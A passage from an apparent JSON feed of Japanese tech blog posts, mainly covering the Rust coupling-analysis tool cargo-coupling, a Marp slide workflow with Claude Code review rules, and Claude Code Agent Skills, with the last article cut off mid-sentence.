滋比古筑摩書房Amazon新版　「読み」の整理学 (ちくま文庫)作者:外山滋比古筑摩書房Amazon忘却の整理学 (ちくま文庫)作者:外山滋比古筑摩書房Amazon忘却の効用　「忘れること」で脳は何を得るのか作者:スコット・A・スモール,寺町朋子白揚社Amazon苦痛の心理学:なぜ人は自ら苦しみを求めるのか作者:ポール・ブルーム草思社Amazon「恥」に操られる私たち　他者をおとしめて搾取する現代社会作者:キャシー・オニール白揚社Amazon社会は、静かにあなたを「呪う」　～思考と感情を侵食する“見えない力”の正体～ (小学館クリエイティブ)作者:鈴木祐小学館Amazon半うつ　憂鬱以上、うつ未満作者:平 光源サンマーク出版Amazon地に足をつけて生きろ！ 加速文化の重圧に対抗する7つの方法作者:スヴェン・ブリンクマンEvolvingAmazon","isoDate":"2025-12-21T00:24:56.000Z","dateMiliSeconds":1766276696000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"【宇宙】MultimodalUniverse を使って活動銀河核(AGN)の2クラス分類を作ってみる","link":"https://qiita.com/tozastation/items/09e118bf67e129813d00","contentSnippet":"この記事は 3-shake Advent Calendar 2025 の21日目の記事です。@tozastationです。普段はWebアプリを開発したり、そのアプリや学習ジョブが動く Kubernetes 基盤の面倒をみています。宇宙が好きなのとAI/MLの方たちがどうい...","isoDate":"2025-12-20T22:06:44.000Z","dateMiliSeconds":1766268404000,"authorName":"tozastation","authorId":"tozastation"},{"title":"IAM Roles Anywhereを使ってオンプレKubernetesでExternal Secrets Operatorを試してみる","link":"https://qiita.com/yutaf11/items/703c7b875157ddf799fc","contentSnippet":"はじめにオンプレミスのKubernetesとAmazon EKSによるハイブリッド構成において、シークレット管理の統合は重要な課題の一つです。セキュリティと運用の一貫性を考慮すると、AWS Secrets Managerをシークレット情報のシングルソースとして利用する構...","isoDate":"2025-12-20T14:24:07.000Z","dateMiliSeconds":1766240647000,"authorName":"Yuta Fujii","authorId":"yutaf11"},{"title":"cargo-coupling: Rustプロジェクトの結合度を可視化する","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/20/195329","contentSnippet":"cargo-coupling を自己診断した時のweb ui です。はじめに「このモジュール、なんか触りたくないな...」ソフトウェア開発をしていると、こんな感覚を覚えることがあります。変更するたびに他の箇所が壊れる、テストが書きにくい、そもそも何をしているのか把握しづらい。これらの症状には共通点があります。モジュール同士が過剰に依存し合っている、つまり結合（カップリング）の問題です。結合の問題は厄介です。コードを書いているときには気づきにくく、後から「なぜこんなに変更が大変なのか」と悩むことになります。さらに困るのは、「結合が強すぎる」と分かっても、具体的にどこがどう強いのか、どこから手をつければいいのかが見えにくいことです。振り返ってみると、私は結合に対する解像度がかなり低かったのではないでしょうか。「なんとなく密結合っぽい」「疎結合の方がいいらしい」という感覚で良し悪しを判断していた。でも、その感覚を言葉にしようとすると、うまく説明できない。この「見えにくさ」を解消するには、結合を測る物差しが必要です。しかし、従来の「強い/弱い」という1軸だけでは不十分でした。なぜなら、同じ「強い結合」でも、場所や状況によって意味が変わるからです。そこで注目したいのが、Vlad Khononovの「Balanced Coupling」という考え方です。結合を「強度」「距離」「変動性」の3つの軸で捉え、それらのバランスを評価するフレームワークです。今回紹介するcargo-couplingは、このフレームワークをRustプロジェクト向けに実装したツールです。AIがコードを書く時代になっても、この結合度という指標は重要性を増すはずです。なぜなら、コードを書く主体が誰であれ、そのコードを理解し、保守し、拡張するのは人間だからです。むしろAIが生成したコードだからこそ、その構造を客観的に評価できる物差しが必要になります。まずはツールの概要を見てから、その背景にある考え方、そして実際の使い方へと進んでいきましょう。cargo-couplingとはcargo-couplingは、私がRustプロジェクト向けに開発した結合度分析ツールです。このツールを作るきっかけになったのは、Vlad Khononovの著作「Balancing Coupling in Software Design」との出会いでした。結合設計について漠然と感じていた課題が、この本で体系的に整理されていたのです。「強度」「距離」「変動性」という3つの軸で結合を捉えるフレームワークに感銘を受け、これをRustプロジェクトで実際に使えるツールにしたいと考えました。書籍は翻訳も含めて読みやすいので、ぜひ手に取ってみてください。ソフトウェア設計の結合バランス　持続可能な成長を支えるモジュール化の原則 (impress top gearシリーズ)作者:Vlad KhononovインプレスAmazonツールはGitHubで公開しています。気に入ったらStarしていただけると励みになります。github.comcrates.ioからインストールできます。https://crates.io/crates/cargo-couplingcrates.ioここで、多くの人が持っている常識を一度疑ってみましょう。「結合は減らすべきだ」——そう思っていませんか？このツールは「結合を減らす」ことを目標にしていません。「結合を適切に設計する」ことを目標にしています。なぜなら、結合は本質的に悪ではないからです。関連する機能が密に連携するのは自然なことで、問題になるのは「不適切な場所での強い結合」や「遠く離れたモジュール間の密結合」です。この視点の転換が、このツールの核心です。# インストールcargo install cargo-coupling# 基本的な使い方cargo coupling ./src3つの次元で結合を分析では、「適切な結合」とは具体的に何を指すのでしょうか。従来の結合分析は「強い/弱い」の1軸で考えがちでした。しかし、ここで立ち止まって考えてみてください。同じ「強い結合」でも、すぐ隣のモジュールとの結合と、遠く離れた外部ライブラリとの結合では、意味が違うはずです。また、5年間ほとんど変更されていないコードとの結合と、毎週のように変更されるコードとの結合では、リスクが違うはずです。この違いを捉えるには、1軸では足りません。cargo-couplingは結合を3つの独立した次元で測定します。1. Integration Strength（結合強度）最初の軸は「結合強度」です。モジュール同士が「どれだけ互いの内部を知っているか」を表します。user.password_hashのように構造体のフィールドを直接触っているコード、見覚えがありませんか？これは最も強い結合です。一方、impl Traitを介してやり取りするコードは、相手の内部を知らなくても動作します。この違いをスコア化します。 レベル  スコア  説明  Rust例  Intrusive  1.00  内部実装に直接依存  struct.field 直接アクセス  Functional  0.75  関数シグネチャに依存  メソッド呼び出し  Model  0.50  データ構造に依存  型定義、型パラメータ  Contract  0.25  trait/インターフェースのみ  impl Trait 2. Distance（距離）2つ目の軸は「距離」です。結合されたモジュール同士が、コードのスコープ階層でどれだけ離れているかを表します。同じファイル内の関数同士が密に連携しているのは自然なことです。しかし、src/auth/login.rsがsrc/billing/invoice.rsを直接参照していたらどうでしょう？さらに、外部クレートの内部構造に依存していたら？距離が遠いほど、その結合の「重さ」は増します。 レベル  スコア  説明  SameModule  0.25  同一ファイル/モジュール内  DifferentModule  0.50  同一クレート内の別モジュール  DifferentCrate  1.00  外部クレートへの依存 3. Volatility（変動性）3つ目の軸は「変動性」です。「どれくらい頻繁に変更されるか」を表します。あなたのプロジェクトにも、1年以上触られていない安定したモジュールと、毎週のように修正が入るモジュールがあるはずです。安定したコードに依存するのと、頻繁に変わるコードに依存するのでは、リスクが違います。cargo-couplingはGit履歴からこの変動性を自動で計算します。 レベル  スコア  Git 6ヶ月での変更回数  Low  0.00  0-2回  Medium  0.50  3-10回  High  1.00  11回以上 バランススコアの計算ここまで3つの次元を見てきました。しかし、「強度が0.75」「距離が0.50」「変動性が中程度」とバラバラに言われても、結局この結合は良いのか悪いのか、判断しづらいですよね。そこでcargo-couplingは、これら3つの次元を組み合わせてバランススコアを計算します。3つの数値を1つのスコアにまとめることで、「この結合は適切か」を直感的に判断できるようになります。考え方はシンプルです。「強度と距離のバランス」と「変動性によるリスク」の2つを掛け合わせます。ALIGNMENT = 1.0 - |STRENGTH - (1.0 - DISTANCE)|VOLATILITY_IMPACT = 1.0 - (VOLATILITY \xd7 STRENGTH)BALANCE_SCORE = ALIGNMENT \xd7 VOLATILITY_IMPACT最初の式は「強度と距離が釣り合っているか」を測ります。距離が近ければ強結合でも問題なく、距離が遠ければ弱結合であるべきです。2番目の式は「変更頻度と結合強度の組み合わせリスク」を測ります。頻繁に変更されるコードと強く結合していると、変更のたびに影響を受けるリスクが高まります。この計算式が導く結論を整理すると、以下のようになります。強結合 + 近距離 → Good：関連機能が1つのモジュールにまとまった高凝集な状態弱結合 + 遠距離 → Good：モジュール間の依存が最小限な疎結合アーキテクチャ強結合 + 遠距離 → Bad：変更影響が広範囲に及ぶグローバル複雑性の状態強結合 + 高変動性 → Bad：頻繁な変更が連鎖的影響を生む変更波及リスク実際に使ってみる理論を理解したところで、実際のプロジェクトでどう使うかを見ていきましょう。cargo-couplingは目的に応じて複数の出力形式を用意しています。サマリー表示cargo coupling --summary ./src出力例は以下のとおりです。Coupling Analysis Summary:  Health Grade: B (Good)  Files: 14  Modules: 14  Couplings: 389  Balance Score: 0.83  Issues:    Medium: 2  Top Priority:    - [Medium] cargo-coupling::main → 21 dependencies    - [Medium] 21 dependents → cargo-coupling::cargo_coupling  Breakdown:    Internal: 33    External: 356    Balanced: 33    Needs Review: 0    Needs Refactoring: 0  Connascence:    Total: 807 (avg strength: 0.23)    High-strength: Position=2, Algorithm=2  APOSD Metrics:    Pass-Through Methods: 12 (simple delegation)    High Cognitive Load: 2 modules    Avg Module Depth: 7.9日本語出力日本語での出力も対応しています。cargo coupling --japanese ./srcカップリング分析: my-project━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━評価: B (Good) | スコア: 0.67/1.00 | モジュール数: 143次元分析:  結合強度: Contract 1% / Model 24% / Functional 66% / Intrusive 8%           (トレイト)   (型)      (関数)        (内部アクセス)  距離:     同一モジュール 6% / 別モジュール 2% / 外部 91%  変更頻度: 低 2% / 中 98% / 高 0%ホットスポット分析リファクタリングすべき優先度の高いモジュールを特定します。cargo coupling --hotspots ./src#1 my-project::main (Score: 55)   \uD83D\uDFE1 Medium: High Efferent Coupling   \uD83D\uDCA1 What it means:      This module depends on too many other modules   ⚠️  Why it\'s a problem:      • Changes elsewhere may break this module      • Testing requires many mocks/stubs      • Hard to understand in isolation   \uD83D\uDD27 How to fix:      Split into smaller modules with clear responsibilities      e.g., Split main.rs into cli.rs, config.rs, runner.rs影響分析特定のモジュールを変更したときの影響範囲を調べられます。cargo coupling --impact metrics ./srcWeb UIでの可視化インタラクティブなグラフで結合関係を可視化できます。cargo coupling --web ./srcブラウザが自動で開き、Cytoscape.jsを使った対話的なグラフが表示されます。ノードをクリックすると詳細情報が見られ、問題のあるモジュールは色分けされます。CI/CDでの活用手動で分析するだけでなく、継続的に品質を監視することもできます。cargo-couplingを品質ゲートとして組み込むと、結合設計の劣化を早期に検出できます。cargo coupling --check \\\\  --min-grade=B \\\\  --max-circular=0 \\\\  ./srcGitHub Actionsの例は以下のとおりです。- name: Check coupling health  run: |    cargo coupling --check \\\\      --min-grade=B \\\\      --max-critical=0 \\\\      ./srcグレードが基準を下回るとexit code 1を返すため、CIパイプラインに組み込めます。AI連携Claude CodeやGitHub Copilotと組み合わせて使う場合、--aiオプションが便利です。cargo coupling --ai ./srcAIフレンドリーな形式で出力されるので、そのままAIに貼り付けてリファクタリング提案を得られます。検出される問題パターンここまで使い方を見てきましたが、具体的にどんな問題が検出されるのか気になるところでしょう。cargo-couplingが警告する代表的なパターンを紹介します。God Module（神モジュール）関数、型、implが多すぎるモジュールです。関数: 30個以上型: 15個以上impl: 20個以上High Efferent Coupling（外向き結合過多）依存先が多すぎるモジュール。デフォルトでは20以上の依存で警告されます。High Afferent Coupling（内向き結合過多）依存されすぎているモジュール。デフォルトでは30以上の依存元で警告されます。Cascading Change Risk（変更波及リスク）侵入的結合（Intrusive）と高変動性（High Volatility）の組み合わせ。変更のたびに広範囲に影響が及ぶ危険な状態です。ヘルスグレードの解釈問題パターンの検出結果は、最終的に1つのグレードに集約されます。このグレードがプロジェクト全体の健全性を示します。 Grade  説明  S  Over-optimized。リファクタリングしすぎかも  A  Well-balanced。理想的な状態  B  Healthy。管理可能な状態  C  改善の余地あり  D  注意が必要  F  即刻対応が必要 興味深いのは、Sグレードが「やりすぎ」とされている点です。なぜでしょうか？結合を減らしすぎると、コードが細切れになりすぎて、かえって全体像が見えなくなります。1つの処理を追うために10個のファイルを開く必要があったり、抽象化のレイヤーが深すぎて「結局何をしているの？」と迷子になったり。そういう経験はありませんか？結合は「減らせばいい」という単純な話ではありません。バランスが大切なのです。ライブラリとしての利用CLIツールとして使うだけでなく、独自のツールに組み込むこともできます。cargo-couplingはライブラリとしても公開しているので、プログラムから直接分析機能を呼び出せます。use cargo_coupling::{    analyze_workspace,    analyze_project_balance_with_thresholds,    IssueThresholds,    VolatilityAnalyzer,};fn main() -> Result<(), Box<dyn std::error::Error>> {    // AST解析    let mut metrics = analyze_workspace(Path::new(\\"./src\\"))?;    // Git変動性分析    let mut volatility = VolatilityAnalyzer::new(6);    volatility.analyze(Path::new(\\"./src\\"))?;    metrics.file_changes = volatility.file_changes;    metrics.update_volatility_from_git();    // バランス分析    let report = analyze_project_balance_with_thresholds(        &metrics,        &IssueThresholds::default()    );    println!(\\"Grade: {}\\", report.health_grade);    Ok(())}パフォーマンスcargo-couplingは、大規模プロジェクトでも高速に動作するよう設計されています。Rayonによる並列AST解析Git履歴のストリーム処理実績: tokio（488ファイル）で655ms--no-gitオプションを使えば、Git分析をスキップしてより高速に動作します。制限事項便利なツールですが、万能ではありません。使う前に知っておくべき制限があります。外部クレート依存は分析対象外: serde、tokioなどへの依存は分析されない。開発者がコントロールできない部分のため静的解析のみ: ランタイムの動作やマクロ展開は完全には捉えられないGit履歴が必要: Volatility分析にはGit履歴が必要。履歴が短いと精度が下がるまとめcargo-couplingは、「結合は悪」という単純な考え方ではなく、「適切な結合を選ぶ」という実用的なアプローチを提供します。3次元分析: 強度・距離・変動性を同時に考慮Git連携: 実際の変更頻度をデータとして反映実行可能な提案: 具体的なリファクタリングアクションを提示複数の出力形式: テキスト/JSON/Web UI/AIフレンドリーCI/CD統合: 品質ゲートとして自動チェック完璧な設計を目指す必要はありません。「80%の改善で十分」というプラグマティックな姿勢で、少しずつプロジェクトの健全性を高めていきましょう。# まずは試してみてくださいcargo install cargo-couplingcargo coupling --summary ./src結合の問題が可視化されるだけでも、設計改善の第一歩になります。次にあなたが「このモジュール、なんか触りたくないな...」と感じたとき、それはもう漠然とした不安ではありません。強度・距離・変動性という3つの軸で分析でき、具体的な改善アクションに落とし込める、対処可能な課題です。その感覚は、恐れではなく、改善の入り口なのです。似た概念にA Philosophy of Software DesignのComplexity がある。これも良い考え方なので一読をおすすめします。 speakerdeck.comA Philosophy of Software Design, 2nd Edition (English Edition)作者:Ousterhout, John K. ISSVWOAmazon","isoDate":"2025-12-20T10:53:29.000Z","dateMiliSeconds":1766228009000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Unmasking the Weak Points: Probing LLM Frontiers with garak","link":"https://daisuke1024akagawa.medium.com/unmasking-the-weak-points-probing-llm-frontiers-with-garak-50f4db714a62?source=rss-c54ac439ad2b------2","isoDate":"2025-12-20T05:24:29.000Z","dateMiliSeconds":1766208269000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"書いた方が良いの? BigQueryテーブルのカラム説明文の有無による生成AI機能の差異検証","link":"https://zenn.dev/nedoko_dok0dko/articles/a7124ea372eb91","contentSnippet":"※3-shake Advent Calendar 2025の20日目のエントリー記事です。※12/22追記: BigQuery Advent Calendar 2025の21日目のエントリー記事として追加しました。BigQueryアドベントカレンダーの盛り上がりの一助となれば幸いです。皆さんこんにちは。2025年ももう終わりですね。今年は様々な所で生成AIの機能やサービスが登場しました。私はお仕事関連でGoogle Cloudを触ることが多かったのですが、AI関連の機能は追加や更新の早さが凄まじく「早すぎて…見えない!」となっていました。さて、今回はGoogle Cloud...","isoDate":"2025-12-19T15:00:02.000Z","dateMiliSeconds":1766156402000,"authorName":"seno","authorId":"seno"},{"title":"Master the AI Wave: 10 Tech Blogs That Keep You Ahead of the Curve","link":"https://daisuke1024akagawa.medium.com/master-the-ai-wave-10-tech-blogs-that-keep-you-ahead-of-the-curve-5cd0225ccc45?source=rss-c54ac439ad2b------2","contentSnippet":"Today, I’ll let you know 10 amazing tech blogs you should read.Continue reading on Medium \xbb","isoDate":"2025-12-19T13:01:07.000Z","dateMiliSeconds":1766149267000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"生成AI時代のMarp によるスライド環境の構築","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/19/183148","contentSnippet":"この記事は、3-shake Advent Calendar 2025 19日目のエントリ記事です。はじめにエンジニアがプレゼン資料を作るとき、PowerPointやKeynoteにもどかしさを感じることがあります。コードを書くようにスライドを作りたい。Gitでバージョン管理したい。テーマを一括で変更したい。Marpはこれらの願望を叶えるマークダウンベースのスライド生成ツールです。marp.appしかし生成AI時代の今、新しい課題が生まれています。AIにスライドの下書きを依頼できるようになった反面、「AIっぽいプレゼン」が量産されるようになりました。整然としすぎて、話者の思考が見えない資料です。この記事では、AIの力を借りつつ「自分のプレゼン」を取り戻す仕組みを紹介します。AIっぽいプレゼンの正体生成AIにプレゼン資料を依頼すると、だいたい同じ構成になります。「まず、次に、最後に」という接続詞。きれいに3項目並んだ箇条書き。当たり障りのない結論。これは決して間違っていません。しかし聴衆の記憶には残りません。なぜでしょうか。聴衆の脳は「予測を裏切られた瞬間」に活性化します。「まず、次に、最後に」という予定調和な構成では、脳は省エネモードで聞き流します。3項目の箇条書きを見た瞬間、聴衆は「ああ、3つあるのね」と思考を止めます。AIが生成するプレゼンは、統計的に最も頻出するパターンの再現です。だから誰が作っても似たような資料になります。Marpを選んだ理由はシンプルです。マークダウンはプレーンテキストなので、AIが直接編集でき、人間がTextlintやカスタムルールで機械的にチェックできます。PowerPointのようなバイナリ形式では「AI生成→ルール検証」の流れが困難です。Gitで差分管理でき、CSSでデザインを一括制御できる点も大きいです。プロジェクト構造実際に運用しているMarpプロジェクトの構造を紹介します。github.com3shake-marp-templates/├── templates/              # 再利用可能なテンプレート├── themes/                 # CSSテーマ├── slides/2025/           # 実際のプレゼンテーション├── assets/images/         # 画像資産└── .claude/               # Claude Code統合    ├── commands/          # スラッシュコマンド    ├── agents/            # 専門家エージェント    └── rules/             # 執筆ルールポイントは.claude/ディレクトリです。Claude Codeと統合することで、スライドのレビューを自動化しています。CommandsやSub-agentsの詳細については、以前の記事で解説しています。syu-m-5151.hatenablog.comMarpの基本設定.marprc.ymlでMarpを設定します。allowLocalFiles: truehtml: truemermaid: truebespoke:  progress: trueoptions:  engine: \'@marp-team/marp-core\'mermaid: trueでMermaid記法の図表が使えます。しかし正直なところ、PDFエクスポート時に崩れることがあります。重要な図は画像として用意するほうが安全です。package.jsonのスクリプトは以下の通りです。{  \\"scripts\\": {    \\"start\\": \\"marp -s . --html --allow-local-files\\",    \\"build\\": \\"marp --html --allow-local-files\\"  }}npm startでローカルサーバーが起動し、ファイル保存のたびに自動リロードされます。テーマによるブランディングCSSテーマで全スライドに統一感を持たせます。/* 3shake-theme.css */:root {  --3shake-blue: #4AADDD;  --3shake-blue-dark: #0a1929;  --3shake-yellow: #ECBE30;}section {  background: white;  font-family: \'Noto Sans JP\', sans-serif;}/* 全スライドにロゴを自動配置 */section::after {  content: \'\';  background-image: url(\'../assets/images/logo.png\');  position: absolute;  left: 30px;  bottom: 20px;}ロゴとページ番号が自動配置されます。プレゼン作成者はブランディングを意識する必要がなくなります。AIっぽさを排除するルールここからが本題かもです。.claude/rules/slide-writing.mdに以下の禁止事項を定義しています。箇条書きを3項目で揃えない（2つか4つにする）「まず、次に、最後に」という機械的な接続詞を使わない完全に等分な説明をしない（メリハリをつける）抽象的で当たり障りのない表現を避けるなぜ2つか4つなのか。 聴衆の「3つだろう」という予測を外すためです。2つなら対比が明確になり、4つなら網羅感が出ます。3つは「ちょうどいい」ゆえに印象へ残りません。意図的にパターンを崩すことで、聴衆の能動的な思考を促します。「PowerPointでも同じルールを適用できる」という反論があるでしょう。確かにその通りです。しかしPowerPointでは、このルールを機械的にチェックする手段がありません。Marpならテキストベースなので、「3項目の箇条書きを検出したら警告」というルールを自動実行できます。人間の意志力に頼らず、仕組みで品質を担保します。身体性の供給以前の記事で「AIに記事を書かせるとは何か」について書きました。プレゼンにも同じことが言えます。AIは構造化が得意です。しかし「身体性」は供給できません。ここで言う身体性とは、知識が「情報」から「経験」へと変容する過程で生じる一人称的な認知の軌跡です。たとえば「このツールを導入したら開発効率が上がった」という情報と、「導入時に設定で3時間ハマってドキュメントの不備に気づきPRを送った」という経験は別物です。プレゼンにおける身体性とは、「なぜこのトピックを選んだのか」「どこで躓いたのか」「何に感動したのか」という、話者固有の軌跡です。これはAIには生成できません。私の作業フローはこうです。伝えたいメッセージを箇条書きで書き出す（5-7個）各メッセージに「自分だけが語れる具体例」を追加AIにレビューを依頼し、構成を整える/review-slideで「3項目の箇条書き」「まず・次に」の指摘を確認指摘箇所を修正AIは足す。人間は削る。 AIは情報の網羅性を最適化しますが、プレゼンの核心は何を省くかにあります。「このトピックは聴衆の関心外」と判断するには、聴衆の反応を想像する力が必要です。この能力は現在のLLMには実装されていません。だからアウトラインは自分で考え、AIにはレビューを任せます。おわりにMarpとルールベースのチェック、そしてClaude Codeのエージェント。この組み合わせで実現したのは、「AIの力を借りながら、自分の思考を残す」環境です。完璧に整った資料より、少し不格好でも話者の考えが透けて見える資料のほうが、聴衆の記憶に残ります。AIが生成した「もっともらしい」スライドではなく、自分の経験に根ざした「本物の」スライドを作る。そのための環境がMarp\xd7Claude Codeです。まずは既存のスライドを1枚だけMarkdown化してみてください。それがMarp\xd7AI環境構築の第一歩です。","isoDate":"2025-12-19T09:31:48.000Z","dateMiliSeconds":1766136708000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Claude Codeの Agent Skills は設定したほうがいい","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/19/173309","contentSnippet":"Claude Codeを使い始めて、様々な発信をしてきました。今回は「Agent Skills」について。これも設定しておくと、Claude Codeがグッと使いやすくなる機能です。Claude Code の settings.json は設定した方がいい - じゃあ、おうちで学べるClaude Code の CLAUDE.mdは設定した方がいい - じゃあ、おうちで学べるClaude Code の .claude/commands/**.md は設定した方がいい - じゃあ、おうちで学べるClaude CodeのHooksは設定したほうがいい - じゃあ、おうちで学べるClaude CodeのSubagentsは設定したほうがいい - じゃあ、おうちで学べるはじめに「このプロジェクトではpython-pptxを使ってスライドを作って」「SQLは必ずこのフォーマットで書いて」「コードレビューはこの観点でチェックして」。Claude Codeを使っていると、こういう説明を何度も繰り返すことになります。CLAUDE.mdに書けば解決すると感じるでしょう。しかしCLAUDE.mdに書いても、毎回読み込まれるとは限らない。commandsを作っても、手動で呼び出す必要がある。どちらも「繰り返し」を完全には解決してくれません。私自身、Rustプロジェクトの開発をClaude Codeに任せようとして、この問題に何度もぶつかりました。「ビルドはcargo fmtから始めて」「セキュリティチェックはOWASPの観点で」「テストは統合テストまで回して」。1回のセッションでは覚えてくれる。しかし新しいセッションを始めると、また最初から説明し直し。なぜこうなるのか。この問題の根本にあるのは、LLMのアーキテクチャ上の制約です。LLMはステートレスで、セッション間で記憶を保持しません。トークン制約とコスト制約があるため、すべての知識を常に保持できません。だから、毎回同じ説明が必要になります。Agent Skillsは、この制約を回避する仕組みです。すべての知識を常に持たせるのではなく、必要な時に必要な知識だけを読み込む。この発想の転換により、ステートレスなLLMでも「状態を持っているかのように」振る舞えます。一度Skillを作っておけば、関連するタスクで自動的にその知識が使われます。www.anthropic.comこのブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。他の設定との違い今まで紹介してきた機能との違いを整理しておきます。 機能  役割  例  CLAUDE.md  プロジェクトの文脈を伝える  「うちはTypeScriptで、こういうアーキテクチャ」  commands  手動で呼び出すショートカット  /test-and-commit で一連の作業を実行  Hooks  特定のイベントで自動実行  ファイル保存後に自動フォーマット  Subagents  専門家を自動で呼び出す  デバッグ時にdebugger subagentが起動  Rules  パス単位でルールを適用  src/api/**/*.tsにセキュリティルール  Agent Skills  専門知識をオンボーディング  PDF操作、Excel分析、独自ワークフロー Rulesについて補足: .claude/rules/ディレクトリに配置することで、特定の拡張子やディレクトリに対して細かいルールを適用できます。CLAUDE.mdがグローバルな設定なのに対し、Rulesは「このパスにはこのルール」という精密なスコープ設定が可能です。無駄なコンテキスト消費を抑えつつ、必要なルールだけを読み込ませる「段階的開示」の考え方に基づいています。Rulesについては別記事で詳しく書く予定です。表を見ると、各機能には明確な役割分担があります。CLAUDE.mdは文脈、commandsはショートカット、Hooksは自動化、Subagentsは専門家の呼び出し。では、Skillsは何が違うのか。ポイントは、Skillsが「Claudeができること自体を拡張する」点です。他の設定がClaudeの「使い方」を定義するのに対し、SkillsはClaudeの「専門知識」を拡張します。LLMの推論能力自体は変わりませんが、専門家の知識を注入することで出力品質が向上します。Agent Skillsとは何かAnthropicの公式ブログでは、Agent Skillsをこう説明しています。Building a skill for an agent is like putting together an onboarding guide for a new hire.（エージェントにSkillを作ることは、新入社員向けのオンボーディングガイドを作るようなものです）Skillは、指示・スクリプト・リソースをまとめたフォルダです。Claudeがタスクに応じて自動的に読み込み、その専門知識を活用します。platform.claude.comSkill に関しても公式ドキュメントが本当に良いのでオススメです。Anthropicはとりあえず、公式ドキュメントこれは標語にしてほしいです。platform.claude.comそれでも自分的にまとめたいので書かせていただきます。なぜSkillsが必要なのかClaude Codeは万能ですが、「特定のタスク」に最適化されていないことがあります。例えばPowerPointを作ろうとすると、どのライブラリを使うか迷います。フォーマットの細かい仕様を知らない。エッジケースでバグる。毎回試行錯誤が発生します。一方、Skillsがあれば違います。AnthropicのエンジニアがPowerPoint作成の最適解を徹底的に検証して、その知識をパッケージ化している。Claudeはそれを読み込んで、最初からプロとしての出力ができます。この辺は松本勇気さんの生成AI「戦力化」の教科書なんかもとても良いし今度、オライリーから翻訳本AIエンジニアリング―基盤モデルを用いたAIアプリケーション開発の基礎と実践もとても良い。Tool、Skills、MCPの違い混乱しやすいポイントを整理しておきます。Anthropicのブログ記事では、わかりやすいたとえが使われています。claude.comMCP is like having access to the aisles. Skills, meanwhile, are like an employee\'s expertise.（MCPは店の通路へのアクセス。Skillsは店員の専門知識。）壊れたキャビネットを直したいとき、ハードウェアストアに行けば木工用接着剤もクランプも蝶番も揃っています。しかし、何を買えばいいか、どう使えばいいかは別問題です。 概念  役割  たとえ  Tool  何ができるか（Capability）  店にある道具そのもの  MCP  道具へのアクセス（Connectivity）  店の通路に入ること  Skills  どう振る舞うか（Behavior）  道具の使い方を教える店員 Toolは「APIを叩く」「DBに接続する」「ファイルを操作する」といった個別の能力です。MCPはそれらのToolを統一規格で接続するアダプター。外部システムへの安全で標準化されたアクセスを提供します。そしてSkillsは「どう振る舞うか（Behavior）」まで定義します。複数のToolをどの順番で、どういう判断基準で使うか。Toolの使い方マニュアル付きで渡すのがSkillsです。MCPが接続性を提供し、Skillsがその接続性を効果的に使うための手続き的知識を提供する。両者は競合するものではなく、組み合わせることで真価を発揮します。この構造は、BDD（Behavior-Driven Development、振る舞い駆動開発）に似ています。BDDは単なるテスト手法ではなく、チーム全体の「対話」を促進し、ビジネス価値の高いソフトウェアを効率的に生み出すための開発アプローチです。TDD（テスト駆動開発）が「コードが正しく実装されているか」という開発者視点なのに対し、BDDは「システムが期待通りに振る舞うか」というユーザー・ビジネス視点で考えます。BDDでは、Gherkin記法を使って「Given-When-Then」形式でシナリオを書きます。Feature: ログイン機能  Scenario: ユーザーが正しいIDとパスワードでログインできる    Given ログインページが表示されている    When  正しいIDとパスワードを入力してログインボタンを押す    Then  ホームページにリダイレクトされるこのシナリオは、開発者だけでなく、QAエンジニア、プロダクトオーナー、ビジネス担当者など、全員が読めます。これが「生きた仕様書」として機能し、認識の齟齬を埋めます。Skillsも同じ構造を持っています。 BDD  Skills  Given（前提条件）  description（いつ起動するか）  When（アクション）  SKILL.md本文（何をするか）  Then（期待結果）  具体的な手順（どう振る舞うか） BDDがテストで「コードの振る舞い」を保証するように、SkillsはAIエージェントの「振る舞い」を保証します。BDDの本質的な価値は「ビジネス側とエンジニアの共通言語」でした。「3つのアミーゴ」（PO、開発者、QA）が対話し、全員が納得する仕様を作り上げます。Skillsも同じです。現場のドメインエキスパートがMarkdownで書いた手順は、そのままAIの振る舞いになります。つまり、Skillsは「AIエージェントのためのBDD」だと言えます。プログラミングなしで、自然言語で、AIの振る舞いを定義できます。Progressive Disclosure（段階的開示）Skillsの設計で最も重要な概念が「Progressive Disclosure（段階的開示）」です。これは「すべての情報を最初から渡すのではなく、必要になったタイミングで必要な情報だけを渡す」という設計原則です。なぜこの原則がSkillsに必要なのか。LLMには「コンテキストウィンドウ」という物理的な制約があります。Claude 3.5 Sonnetで約200Kトークン。これは多いようで、実際のタスクでは意外と消費が早い。コードファイルを10個読み込めば数万トークン、会話履歴が長くなればより消費される。ここに50個のSkillsの全内容（各5000トークン）を読み込んだら、250Kトークン。コンテキストが溢れます。だからSkillsは3段階で情報を開示します。これは「必要な時に必要な分だけ」というJust-In-Time戦略です。Level 1: メタデータ（常にロード） - 約100トークン/Skill---name: pdf-processingdescription: Extract text and tables from PDF files, fill forms, merge documents.---起動時に全Skillのname/descriptionだけ読み込みます。50個のSkillがあっても5000トークン程度。これでClaudeは「どんなSkillが使えるか」の全体像を把握できます。Level 2: 指示（トリガー時にロード） - 5000トークン以下が目安SKILL.mdの本文。「PDFを操作して」と言われたら、descriptionから「pdf-processingが関連する」と判断し、そのSKILL.mdを読み込みます。関係ないSkillは読み込まない。Level 3: リソース（必要時にロード） - 必要に応じて追加のファイル、スクリプト、リファレンス。SKILL.md内で「フォーム入力が必要ならFORMS.mdを参照」と書いておけば、そのタスクが発生したときだけ読み込みます。pdf-skill/├── SKILL.md              # Level 2: メイン指示├── FORMS.md              # Level 3: フォーム入力ガイド├── reference.md          # Level 3: APIリファレンス└── scripts/    └── fill_form.py      # Level 3: ユーティリティスクリプトこの設計の本質は「推論空間の段階的絞り込み」です。 Level 1で「使えるSkillの候補」を提示し、Level 2で「このタスクにはこの手順」を特定し、Level 